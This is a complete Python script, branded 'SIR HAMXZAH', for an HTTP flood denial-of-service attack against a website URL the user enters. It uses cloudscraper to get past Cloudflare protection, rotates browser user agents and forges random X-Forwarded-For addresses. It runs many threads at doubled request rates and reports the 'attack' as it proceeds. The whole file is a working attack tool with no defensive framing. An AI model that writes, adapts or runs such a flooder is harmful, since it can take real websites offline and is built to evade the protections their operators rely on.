import pyfiglet
import colorama
import random
import threading
import time
import requests
from colorama import Fore
import cloudscraper

scraper = cloudscraper.create_scraper()

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Opera/9.80 (Windows NT 6.2; WOW64) Presto/2.12.388 Version/12.18'
]

def send_http_request(url, user_agent, ip):
    try:
        headers = {'User-Agent': user_agent, 'X-Forwarded-For': ip}
        response = scraper.get(url, headers=headers, timeout=2)
        if response.status_code == 200:
            print(Fore.MAGENTA + f"Sent request to {url} from {ip}")
    except requests.RequestException as e:
        print(Fore.RED + f"Error sending request to {url}: {e}")

def http_flood(url, duration, threads, rps):
    total_requests = duration * rps * 2  # Double the total requests
    start_time = time.time()

    def thread_func():
        nonlocal total_requests
        while total_requests > 0:
            ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            user_agent = random.choice(user_agents)
            send_http_request(url, user_agent, ip)
            total_requests -= 1

    thread_list = []
    for _ in range(threads * 2):  # Double the number of threads
        thread = threading.Thread(target=thread_func)
        thread.start()
        thread_list.append(thread)

    for thread in thread_list:
        thread.join()

    end_time = time.time()
    print(Fore.GREEN + f"HTTP flood attack finished in {end_time - start_time} seconds")

def main():
    print(Fore.BLUE + pyfiglet.figlet_format("SIR HAMXZAH"))
    print(Fore.YELLOW + "Please enter the website URL:")
    url = input().strip()
    print(Fore.YELLOW + "Please enter the duration (seconds):")
    duration = int(input())
    print(Fore.YELLOW + "Please enter the RPS (requests per second):")
    rps = int(input()) * 2  # Double the RPS
    print(Fore.YELLOW + "Please enter the number of threads:")
    threads = int(input()) * 2  # Double the threads
    
    print(Fore.CYAN + "Attack is being sent to the website...")
    http_flood(url, duration, threads, rps)

if __name__ == "__main__":
    main()
